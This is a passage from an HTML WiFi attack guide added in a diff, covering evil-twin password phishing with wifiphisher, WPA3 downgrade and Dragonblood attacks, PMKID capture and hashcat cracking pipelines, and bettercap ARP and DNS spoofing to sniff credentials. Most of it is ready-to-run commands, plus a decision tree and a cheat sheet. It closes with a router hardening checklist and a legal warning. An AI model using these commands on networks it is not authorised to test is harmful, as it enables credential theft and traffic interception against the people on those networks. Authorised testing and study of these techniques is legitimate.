+<span class="c"># Other templates: oauth-login | wifi_connect | plugin_update</span>
+
+<span class="c"># Password captured when victim submits:</span>
+<span class="c"># [*] POST: wifipassword=MyPassword123</span></pre>
+    </div>
+
+    <div class="box box-blue">
+      <div class="box-icon">💡</div>
+      <div class="box-body">
+        <strong>Two Adapters for Best Results</strong>
+        <p>wlan0 = host the fake AP. wlan1 = continuously deauthenticate from the real AP. wifiphisher handles this with
+          -aI and -jI. With only one adapter, success rate drops significantly as clients may reconnect to the real AP.
+        </p>
+      </div>
+    </div>
+
+    <!-- ══ CHAPTER 5 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 5</div>
+      <h2>WPA3 Testing — SAE / Dragonblood</h2>
+    </div>
+
+    <h3>5.1 — Test for Transition Mode (Most Likely to Work)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Many WPA3 routers run WPA2/WPA3 'Transition Mode'</span>
+<span class="c"># hcxdumptool can still capture WPA2 PMKID/handshake from these</span>
+<span class="k">sudo hcxdumptool -i wlan0 \</span>
+  <span class="s">-w wpa3test.pcapng \</span>
+  <span class="s">-c 2437 \</span>
+  <span class="s">--filterlist_ap=TARGETMACNOCOLONS \</span>
+  <span class="s">--filtermode=2 \</span>
+  <span class="s">--enable_status=15</span>
+
+<span class="k">hcxpcapngtool wpa3test.pcapng -o hash.22000</span>
+wc -l hash.22000
+<span class="c"># &gt; 0 lines = WPA2 fallback captured → crack like normal WPA2</span>
+<span class="c"># = 0 lines = pure WPA3 → use Evil Twin (Chapter 4)</span></pre>
+    </div>
+
+    <h3>5.2 — Dragonblood Attack (CVE-2019-9494, Unpatched Only)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Only effective on firmware from 2019 or earlier (most are patched)</span>
+<span class="k">git clone https://github.com/vanhoefm/dragonslayer</span>
+<span class="k">cd dragonslayer && pip3 install -r requirements.txt</span>
+
+<span class="k">sudo python3 dragonslayer.py \</span>
+  <span class="s">-i wlan0 \</span>
+  <span class="s">--target AA:BB:CC:DD:EE:FF \</span>
+  <span class="s">--ssid 'TargetNetwork'</span></pre>
+    </div>
+
+    <div class="box box-teal">
+      <div class="box-icon">📝</div>
+      <div class="box-body">
+        <strong>WPA3 Reality Check 2025</strong>
+        <p>Pure WPA3 with updated firmware has no known practical offline cracking attack. Best approach: Evil Twin
+          (wifiphisher) which bypasses crypto entirely. For your AirFiber: enable WPA3-ONLY mode (not transition mode)
+          to block downgrade attacks.</p>
+      </div>
+    </div>
+
+    <!-- ══ CHAPTER 6 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 6</div>
+      <h2>Advanced Hashcat Techniques</h2>
+    </div>
+
+    <h3>6.1 — Smart Candidate Pipeline (hcxtools)</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># ─── Step 1: Extract hash AND ESSID wordlist ───</span>
+<span class="k">hcxpcapngtool -o hash.22000 -E essids.txt capture.pcapng</span>
+
+<span class="c"># ─── Step 2: Generate variants from ESSIDs ───</span>
+<span class="k">hcxeiutool -i essids.txt -d digits.txt -x hex.txt -c chars.txt -s sc.txt</span>
+
+<span class="c"># ─── Step 3: Combine + deduplicate ───</span>
+cat essids.txt digits.txt hex.txt chars.txt sc.txt | sort -u > combined.txt
+
+<span class="c"># ─── Step 4: Add rule-mangled variants ───</span>
+<span class="k">hashcat --stdout -r /usr/share/hashcat/rules/best64.rule chars.txt \</span>
+  >> combined.txt
+sort combined.txt | uniq > smartlist.txt
+
+<span class="c"># ─── Step 5: Get weak PSK candidates ───</span>
+<span class="k">hcxpsktool -c hash.22000 >> smartlist.txt</span>
+
+<span class="c"># ─── Step 6: Crack ───</span>
+<span class="k">hashcat -m 22000 hash.22000 smartlist.txt</span>
+<span class="k">hashcat -m 22000 hash.22000 --show</span></pre>
+    </div>
+
+    <h3>6.2 — Attack Modes Reference</h3>
+    <table>
+      <tr>
+        <th>Mode</th>
+        <th>Type</th>
+        <th>Example Command</th>
+      </tr>
+      <tr>
+        <td>-a 0</td>
+        <td>Dictionary</td>
+        <td><code>hashcat -m 22000 hash.22000 rockyou.txt</code></td>
+      </tr>
+      <tr>
+        <td>-a 0 -r</td>
+        <td>Dict + Rules</td>
+        <td><code>hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule</code></td>
+      </tr>
+      <tr>
+        <td>-a 1</td>
+        <td>Combinator</td>
+        <td><code>hashcat -m 22000 hash.22000 words1.txt words2.txt</code></td>
+      </tr>
+      <tr>
+        <td>-a 3</td>
+        <td>Brute Force</td>
+        <td><code>hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d</code></td>
+      </tr>
+      <tr>
+        <td>-a 6</td>
+        <td>Dict + Mask</td>
+        <td><code>hashcat -m 22000 hash.22000 words.txt -a 6 ?d?d?d</code></td>
+      </tr>
+      <tr>
+        <td>--stdin</td>
+        <td>Pipe Input</td>
+        <td><code>hcxpsktool -c hash.22000 | hashcat --stdin -m 22000 hash.22000</code></td>
+      </tr>
+    </table>
+
+    <h3>6.3 — Mask Charset Reference</h3>
+    <table>
+      <tr>
+        <th>Mask</th>
+        <th>Character Set</th>
+        <th>Example Match</th>
+      </tr>
+      <tr>
+        <td><code>?d</code></td>
+        <td>0–9 (digits)</td>
+        <td>?d×8 → <code>12345678</code></td>
+      </tr>
+      <tr>
+        <td><code>?l</code></td>
+        <td>a–z (lowercase)</td>
+        <td>?l×8 → <code>password</code></td>
+      </tr>
+      <tr>
+        <td><code>?u</code></td>
+        <td>A–Z (uppercase)</td>
+        <td>?u?l×6 → <code>Network</code></td>
+      </tr>
+      <tr>
+        <td><code>?a</code></td>
+        <td>All printable</td>
+        <td>Any keyboard character</td>
+      </tr>
+      <tr>
+        <td><code>?s</code></td>
+        <td>Special !@#$%^&amp;*</td>
+        <td>Symbols only</td>
+      </tr>
+      <tr>
+        <td><code>?u?l?l?l?d?d?d?d</code></td>
+        <td>Combined</td>
+        <td><code>Home1234</code>, <code>Pass5678</code></td>
+      </tr>
+    </table>
+
+    <!-- ══ CHAPTER 7 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 7</div>
+      <h2>Post-Connection Network Analysis</h2>
+    </div>
+
+    <h3>7.1 — Network Discovery</h3>
+    <div class="code-wrap">
+      <div class="code-title">Terminal</div>
+      <pre><span class="c"># Find your IP and gateway</span>
+ip route show | grep default
+
+<span class="c"># Discover all devices</span>
+<span class="k">sudo nmap -sn 192.168.1.0/24</span>
+
+<span class="c"># Detailed router scan</span>
+<span class="k">sudo nmap -sV -O -p 22,23,80,443,8080,8443 192.168.1.1</span>
+
+<span class="c"># Check for default credentials</span>
+<span class="k">sudo nmap -p 80,443 --script http-default-accounts 192.168.1.1</span>
+
+<span class="c"># Full vulnerability scan</span>
+<span class="k">sudo nmap --script vuln 192.168.1.1</span></pre>
+    </div>
+
+    <h3>7.2 — MitM with bettercap (Replaces Ettercap)</h3>
+    <div class="code-wrap">
+      <div class="code-title">bettercap Interactive Console</div>
+      <pre><span class="k">sudo bettercap -iface wlan0</span>
+
+<span class="c"># Inside bettercap console:</span>
+net.probe on              <span class="c"># Discover all hosts</span>
+net.show                  <span class="c"># List discovered devices</span>
+
+<span class="c"># ARP poisoning — intercept specific target</span>
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+net.sniff on              <span class="c"># Capture cleartext credentials</span>
+
+<span class="c"># DNS spoofing</span>
+set dns.spoof.domains target.com
+dns.spoof on
+
+<span class="c"># HTTP proxy</span>
+http.proxy on</pre>
+    </div>
+
+    <!-- ══ CHAPTER 8 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 8</div>
+      <h2>Full Attack Decision Tree (2025)</h2>
+    </div>
+    <div class="code-wrap">
+      <div class="code-title">Decision Tree</div>
+      <pre>START
+│
+├── Step 1: Prep &amp; Recon
+│     <span class="k">sudo systemctl stop NetworkManager wpa_supplicant</span>
+│     <span class="k">sudo hcxdumptool -i wlan0 --do_rcascan</span>   (30+ seconds)
+│     → Record: BSSID, FREQ (MHz), AUTH type
+│
+├── Step 2: Check WPS
+│     <span class="k">sudo wash -i wlan0mon</span>
+│     ├─ WPS On, Not Locked  →  Pixie Dust: <span class="k">reaver -K 1</span>  (Ch 3)
+│     └─ WPS Off / Locked    →  Skip, continue below
+│
+├── Step 3: By AUTH Type
+│   │
+│   ├─ PSK (WPA2)
+│   │   ├─ PMKID Attack (Ch 1)  ← <span class="n">TRY FIRST</span>
+│   │   │   <span class="k">hcxdumptool -w cap.pcapng -c FREQ --filterlist_ap=MAC</span>
+│   │   │   <span class="k">hcxpcapngtool -o hash.22000 cap.pcapng</span>
+│   │   │   <span class="k">hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule</span>
+│   │   └─ No PMKID → Handshake (Ch 2)
+│   │       airodump + aireplay deauth
+│   │
+│   ├─ SAE (WPA3)
+│   │   ├─ Try PMKID anyway (transition mode often leaks WPA2)
+│   │   ├─ Dragonblood if old firmware  (Ch 5)
+│   │   └─ <span class="k">wifiphisher</span> Evil Twin  ← <span class="n">MOST RELIABLE</span>  (Ch 4)
+│   │
+│   ├─ MGT (Enterprise / RADIUS)
+│   │   └─ hostapd-wpe → capture MSCHAPv2 → <span class="k">hashcat -m 5500</span>
+│   │
+│   └─ OPN (Open / No Password)
+│       └─ Connect directly → <span class="k">bettercap</span> MitM (Ch 7)
+│
+└── Step 4: Post-Connection
+      <span class="k">sudo nmap -sV 192.168.1.0/24</span>
+      <span class="k">sudo bettercap -iface wlan0</span></pre>
+    </div>
+
+    <!-- ══ CHAPTER 9 ════════════════════════════════════════ -->
+    <div class="chapter page-break">
+      <div class="ch-num">Chapter 9</div>
+      <h2>Complete Cheat Sheet</h2>
+    </div>
+
+    <h3>All Commands — 2025 Quick Reference</h3>
+    <table>
+      <tr>
+        <th>Task</th>
+        <th>2025 Command</th>
+      </tr>
+      <tr>
+        <td>Stop services</td>
+        <td><code>sudo systemctl stop NetworkManager wpa_supplicant</code></td>
+      </tr>
+      <tr>
+        <td>List adapters</td>
+        <td><code>hcxdumptool --list_interfaces</code></td>
+      </tr>
+      <tr>
+        <td>Driver test</td>
+        <td><code>sudo hcxdumptool -i wlan0 --check_driver</code></td>
+      </tr>
+      <tr>
+        <td>Set reg domain</td>
+        <td><code>sudo iw reg set IN</code></td>
+      </tr>
+      <tr>
+        <td>Recon scan</td>
+        <td><code>sudo hcxdumptool -i wlan0 --do_rcascan</code></td>
+      </tr>
+      <tr>
+        <td>PMKID targeted</td>
+        <td>
+          <code>sudo hcxdumptool -i wlan0 -w cap.pcapng -c 2437 --filterlist_ap=AABBCCDDEEFF --filtermode=2 --enable_status=15</code>
+        </td>
+      </tr>
+      <tr>
+        <td>PMKID all channels</td>
+        <td><code>sudo hcxdumptool -i wlan0 -w cap.pcapng -F --enable_status=15</code></td>
+      </tr>
+      <tr>
+        <td>Extract hash</td>
+        <td><code>hcxpcapngtool -o hash.22000 -E essids.txt cap.pcapng</code></td>
+      </tr>
+      <tr>
+        <td>Smart candidates</td>
+        <td><code>hcxpsktool -c hash.22000 | hashcat --stdin -m 22000 hash.22000</code></td>
+      </tr>
+      <tr>
+        <td>Crack dict+rules</td>
+        <td><code>hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule</code></td>
+      </tr>
+      <tr>
+        <td>Crack 8-digit</td>
+        <td><code>hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d</code></td>
+      </tr>
+      <tr>
+        <td>Show cracked</td>
+        <td><code>hashcat -m 22000 hash.22000 --show</code></td>
+      </tr>
+      <tr>
+        <td>WPS scan</td>
+        <td><code>sudo wash -i wlan0mon</code></td>
+      </tr>
+      <tr>
+        <td>Pixie Dust</td>
+        <td><code>sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv</code></td>
+      </tr>
+      <tr>
+        <td>Evil Twin</td>
+        <td><code>sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade</code></td>
+      </tr>
+      <tr>
+        <td>Network scan</td>
+        <td><code>sudo nmap -sV 192.168.1.0/24</code></td>
+      </tr>
+      <tr>
+        <td>MitM</td>
+        <td><code>sudo bettercap -iface wlan0</code></td>
+      </tr>
+      <tr>
+        <td>Monitor mode</td>
+        <td><code>sudo iw wlan0 set monitor none</code></td>
+      </tr>
+      <tr>
+        <td>Stop monitor mode</td>
+        <td><code>sudo iw wlan0 set type managed</code></td>
+      </tr>
+    </table>
+
+    <h3>AirFiber Hardening Checklist</h3>
+    <ul>
+      <li>✅ Enable <strong>WPA3-only</strong> mode (not transition) — blocks downgrade attacks</li>
+      <li>✅ <strong>Disable WPS</strong> completely in router admin panel</li>
+      <li>✅ Use a <strong>20+ character random password</strong> — defeats offline cracking</li>
+      <li>✅ Change default admin credentials — AirFiber ships with <code>ubnt / ubnt</code></li>
+      <li>✅ <strong>Update firmware</strong> regularly — patches Dragonblood CVEs</li>
+      <li>✅ Disable remote management from the WAN interface</li>
+      <li>✅ Enable <strong>client isolation</strong> on guest networks</li>
+      <li>✅ Monitor connected devices list weekly for rogue clients</li>
+    </ul>
+
+    <div class="box box-purple" style="margin-top:20px;">
+      <div class="box-icon">🎓</div>
+      <div class="box-body">
+        <strong>Certification Path</strong>
+        <p><strong>OSWP</strong> (Offensive Security Wireless Professional) = gold standard, the only dedicated WiFi
+          pentest cert. <strong>CEH v13</strong> = broad ethical hacking cert. Practice legally on: HackTheBox WiFi
+          challenges, TryHackMe "Wifi Hacking" room, spare router home lab.</p>
+      </div>
+    </div>
+
+    <div class="box box-red" style="margin-top:12px;margin-bottom:40px;">
+      <div class="box-icon">⚠</div>
+      <div class="box-body">
+        <strong>Final Legal Reminder</strong>
+        <p>Every command in this guide must only be used on networks you own or have explicit written permission to
+          test. Unauthorized WiFi attacks are criminal offences: <strong>IT Act 2000 §66 (India)</strong>, CFAA (USA),
+          Computer Misuse Act (UK), and equivalent laws worldwide.</p>
+      </div>
+    </div>
+
+  </div>
+
+</body>
+
+</html>
